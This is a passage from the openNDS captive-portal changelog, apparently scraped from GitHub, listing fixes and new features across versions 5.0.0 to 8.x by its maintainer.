message [bluewavenet] \* Fix - setting gw\_fqdn in hosts file if gw\_ip is changed [bluewavenet] \* Fix - add missing comma before trusted list in ndsctl json [bluewavenet] [gueux] \* Fix - Improve Shell detection [bluewavenet] \* Fix - Improve b64decode performance [bluewavenet] \* Fix - ndsctl -s option [bluewavenet] [gueux] \* Fix - Adjust config defaults to good real world values [bluewavenet] \* Fix - don't override ndsparamlist in ThemeSpec files [bluewavenet] \* Fix - Check ndsctl lock to prevent calling from Binauth [bluewavenet] \* Fix - Clean up syslog messages at info level (2) [bluewavenet] \* Fix - Debian changelog format to allow package building [bluewavenet] \* Fix - numerous compiler errors and BASH compatibility issues [bluewavenet] \* Fix - ndsctl auth, ensure if session timeout = 0 then use global value [bluewavenet] \* Fix - setting of gatewayport, caused by typo in conf.c [bluewavenet] [Ethan-Yami] \* Fix - remove unused credential info from log [bluewavenet] \* Deprecate - the legacy opennds.conf file [bluewavenet]
 -- Rob White <dot@blue-wave.net> Thu, 2 May 2021 17:32:43 +0000
openNDS (8.1.1)
 \* Fix - remove legacy code where option preauthenticated\_users containing the keyword "block" would cause openNDS to fail to start [bluewavenet]
 -- Rob White <dot@blue-wave.net> Thu, 21 Feb 2021 16:33:34 +0000
openNDS (8.1.0)
 \* This version introduces some new functionality and some fixes/enhancements \* Fix - Add default values for gatewayfqdn. If not set in config could result in crash on conection of first client [bluewavenet] \* Add - Authenticated users are now granted access to the router by entry in "list authenticated\_users" [bluewavenet] \* Fix - option preauth was being ignored [bluewavenet] \* Add - query string validity check and entity encode "$" character. Generate error 511 if query string is corrupted [bluewavenet] \* Add - a "Try Again" button to the login.sh script, to be displayed if the client token has expired before login. [bluewavenet]
 -- Rob White <dot@blue-wave.net> Thu, 18 Feb 2021 17:03:23 +0000
openNDS (8.0.0)
 \* This version introduces major new functionality and some major changes \* Rationalisation of support for multiple Linux distributions [bluewavenet] \* Refactor login.sh script introducing base64 encoding and hashed token (hid) support [bluewavenet] \* Refactor fas-hid script introducing base64 encoding and simplifying customisation of the script [bluewavenet] \* Refactor binauth\_log.sh and log BinAuth custom data as url encoded [bluewavenet] \* Refactor fas-aes, simplifying customisation of the script [bluewavenet] \* Refactor fas-aes-https, simplifying customisation of the script [bluewavenet] \* Change - Use hid instead of tok when fas\_secure\_enabled >= 1 [bluewavenet] \* Add - base64 encoding to fas\_secure\_enabled level 1 [bluewavenet] \* Add - gatewyname, clientif, session\_start, session\_end and last\_active to ndsctl json [bluewavenet] \* Add - support for RFC6585 Status Code 511 - Network Authentication Required [bluewavenet] \* Add - Client Status Page UI with Logout [bluewavenet] \* Add - GatewayFQDN option [bluewavenet] \* Add - client interface to status page query string [bluewavenet] \* Add - support using base 64 encoded custom string for BinAuth and replace tok with hid [bluewavenet] \* Add - base 64 decode option to ndsctl [bluewavenet] \* Add - b64 encoding of querystring for level 1 [bluewavenet] \* Add - Improved performance/user-experience on congested/slow systems using php FAS scripts [bluewavenet] \* Add - support for ndsctl auth by hid in client\_list [bluewavenet] \* Add - Ensure faskey is set to default value (always enabled) [bluewavenet] \* Add - Display error page on login failure in login.sh [bluewavenet] \* Add - splash.html, add deprecation notice [bluewavenet] \* Add - authmon, improved lock checking and introduce smaller loopinterval [bluewavenet] \* Add - client\_params, wait for ndsctl if it is busy [bluewavenet] \* Add - fas-aes-https, allow progressive output to improve user experience on slow links [bluewavenet] \* Fix - Block access to /opennds\_preauth/ if PreAuth not enabled [bluewavenet] \* Fix - On startup, call iptables\_fw\_destroy before doing any other setup [bluewavenet] \* Fix - missing final redirect to originurl in fas-hid [bluewavenet] \* Fix - ensure gatewayname is always urlencoded [bluewavenet] \* Fix - client session end not set by binauth [bluewavenet] \* Fix - Session timeout, if client setting is 0, default to global value [bluewavenet] \* Fix - missing trailing separator on query and fix some compiler errors [bluewavenet] \* Fix - ensure authmon daemon is killed if left running from previous crash [bluewavenet] \* Fix - add missing query separator for custom FAS parameters [bluewavenet] \* Fix - ndsctl auth, do not set quotas if client is already authenticated [bluewavenet] \* Fix - client\_params, show "Unlimited" when "null" is received from ndsctl json [bluewavenet] \* Update configuration files [bluewavenet] \* update documentation [bluewavenet]
 -- Rob White <dot@blue-wave.net> Sat, 2 Jan 2021 16:38:14 +0000
openNDS (7.0.1)
 \* This version contains fixes and some minor updates \* Fix - Failure of Default Dynamic Splash page on some operating systems [bluewavenet] \* Fix - A compiler warning - some compiler configurations were aborting compilation [bluewavenet] \* Update - Added helpful comments in configuration files [bluewavenet] \* Remove - references to deprecated RedirectURL in opennde.conf [bluewavenet] \* Update - Documentation updates and corrections [bluewavenet]
 -- Rob White <dot@blue-wave.net> Wed, 7 Nov 2020 12:40:33 +0000
openNDS (7.0.0)
 \* This version introduces major new enhancements and the disabling or removal of deprecated functionality \* Fix - get\_iface\_ip in case of interface is vif or multihomed [bluewavenet] \* Fix - Add missing client identifier argument in ndsctl help text [bluewavenet] \* Deprecate - ndsctl clients option [bluewavenet] \* Add - global quotas to output of ndsctl status [bluewavenet] \* Fix - fix missing delimiter in fas-hid [bluewavenet] \* Add - Report Rate Check Window in ndsctl status and show client quotas [bluewavenet] \* Add - Quota and rate reporting to ndsctl json. Format output and fix json syntax errors [bluewavenet] \* Fix - get\_client\_interface for case of iw utility not available [bluewavenet] \* Fix - php notice for pedantic php servers in post-request [bluewavenet] \* Add - built in autonomous Walled Garden operation [bluewavenet] \* Remove - support for deprecated RedirectURL [bluewavenet] \* Add - gatewaymac to the encrypted query string [bluewavenet] \* Deprecate - legacy splash.html and disable it [bluewavenet] \* Add - support for login mode in PreAuth [bluewavenet] \* Add - Support for Custom Parameters [bluewavenet]
 -- Rob White <dot@blue-wave.net> Wed, 5 Nov 2020 18:22:32 +0000
openNDS (6.0.0)
 \* This version - for Openwrt after 19.07 - for compatibility with new MHD API \* Set - minimum version of MHD to 0.9.71 for new MHD API [bluewavenet] \* Set - use\_outdated\_mhd to 0 (disabled) as default [bluewavenet] \* Add - Multifield PreAuth login script with css update [bluewavenet] \* Add - Documentation and config option descriptions for configuring Walled Garden IP Sets
 -- Rob White <dot@blue-wave.net> Wed, 21 Aug 2020 15:43:47 +0000
openNDS (5.2.0)
 \* This version - for backport to Openwrt 19.07 - for compatibility with old MHD API \* Fix - Failure of MHD with some operating systems eg Debian [bluewavenet] \* Fix - potential buffer truncation in ndsctl \* Set - use\_outdated\_mhd to 1 (enabled) as default [bluewavenet] \* Set - maximum permissible version of MHD to 0.9.70 to ensure old MHD API is used [bluewavenet]
 -- Rob White <dot@blue-wave.net> Wed, 12 Aug 2020 17:43:57 +0000
openNDS (5.1.0)
 \* Add - Generic Linux - install opennds.service [bluewavenet] \* Add - Documentation updates [bluewavenet] \* Add - config file updates [bluewavenet] \* Add - Install sitewide username/password splash support files [bluewavenet] \* Add - quotas to binauth\_sitewide [bluewavenet] \* Add - Splash page updates [bluewavenet] \* Add - Implement Rate Quotas [bluewavenet] \* Fix - check if idle preauthenticated [bluewavenet] \* Add - support for rate quotas [bluewavenet] \* Fix - Correctly compare client counters and clean up debuglevel messages [bluewavenet] \* Add - Implement upload/download quotas Update fas-aes-https to support quotas [bluewavenet] \* Add - Rename demo-preauth scripts and install all scripts [bluewavenet] \* Add - fas-aes-https layout update [bluewavenet] \* Add - Set some defaults in fas-aes-https [bluewavenet] \* Add - custom data string to ndsctl auth [bluewavenet] \* Add - custom data string to fas-hid.php [bluewavenet] \* Add - Send custom data field to BinAuth via auth\_client method [bluewavenet] \* Fix - missing token value in auth\_client [bluewavenet] \* Add - upload/download quota and rate configuration values [bluewavenet] \* Add - Send client token to binauth [bluewavenet] \* Add - Rename upload\_limit and download\_limit to upload\_rate and download\_rate [bluewavenet] \* Fix - Pass correct session end time to binauth [bluewavenet] \* Add - some debuglevel 3 messages [bluewavenet] \* Add - description of the favicon and page footer images [bluewavenet] \* Add - Authmon collect authentication parameters from fas-aes-https [bluewavenet] \* Add - sessionlength to ndsctl auth [bluewavenet] \* Fix - Page fault when ndsctl auth is called and client not found [bluewavenet] \* Add - Enable BinAuth / fas\_secure\_enabled level 3 compatibility [bluewavenet] \* Fix - Correctly set BinAuth session\_end [bluewavenet] \* Add - Updates to Templated Splash pages [bluewavenet] \* Add - Community Testing files [bluewavenet] \* Fix - BinAuth error passing client session times [bluewavenet] \* Fix - PHP notice - undefined constant [bluewavenet] \* Fix - OpenWrt CONFLICTS variable in Makefile [bluewavenet]
 -- Rob White <dot@blue-wave.net> Wed, 24 Jun 2020 20:55:18 +0000
openNDS (5.0.1)
 \* Fix - Path Traversal Attack vulnerability allowed by libmicrohttpd's built in unescape functionality [bluewavenet] [lynxis]
 -- Rob White <dot@blue-wave.net> Wed, 06 May 2020 19:56:27 +0000
openNDS (5.0.0)
 \* Import - from NoDogSplash 4.5.0 allowing development without compromising NoDogSplash optimisation for minimum resource utilisation [bluewavenet] \* Rename - from NoDogSplash to openNDS [bluewavenet] \* Create - openNDS avatar and splash image [bluewavenet] \* Move - wait\_for\_interface to opennds C code ensuring consistent start at boot time for all hardware, OpenWrt and Debian [bluewavenet] \* Add - Enable https protocol for remote FAS [bluewavenet] \* Add - trusted devices list to ndsctl json output [bluewavenet] \* Add - option unescape\_callback\_enabled [bluewavenet] \* Add - get\_client\_token library utility [bluewavenet] \* Add - utf-8 to PreAuth header [bluewavenet] \* Add - PreAuth Support for hashed id (hid) if sent by NDS [bluewavenet] \* Add - library script shebang warning for systems not running Busybox [bluewavenet] \* Add - htmlentityencode function, encode gatewayname in templated splash page [bluewavenet] \* Add - htmlentity encode gatewayname on login page (PreAuth) [bluewavenet] \* Add - Simple customisation of log file location for PreAuth and BinAuth [bluewavenet] \* Add - option use\_outdated\_mhd [bluewavenet] \* Add - url-encode and htmlentity-encode gatewayname on startup [bluewavenet] \* Add - Allow special characters in username (PreAuth) [bluewavenet] \* Add - Documentation updates [bluewavenet] \* Add - Various style and cosmetic updates [bluewavenet] \* Fix - Change library script shebang to bash in Debian [bluewavenet] \* Fix - Remove unnecessary characters causing script execution failure in Debian [bluewavenet] \* Fix - Add missing NULL parameter in MHD\_OPTION\_UNESCAPE\_CALLBACK [skra72] [bluewavenet] \* Fix - Script failures running on Openwrt 19.07.0 [bluewavenet] \* Fix - Preauth, status=authenticated [bluewavenet] \* Fix - Prevent ndsctl from running if called from a Binauth script. [bluewavenet] \* Fix - Minor changes in Library scripts for better portability [bluewavenet] \* Fix - Prevent php notices on pedantic php servers [bluewavenet] \* Fix - broken remote image retrieval (PreAuth) [bluewavenet] \* Fix - Allow use of "#" in gatewayname [bluewavenet]
 -- Rob White <dot@blue-wave.net> Sat, 03 Apr 2020 13:23:36 +0000

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


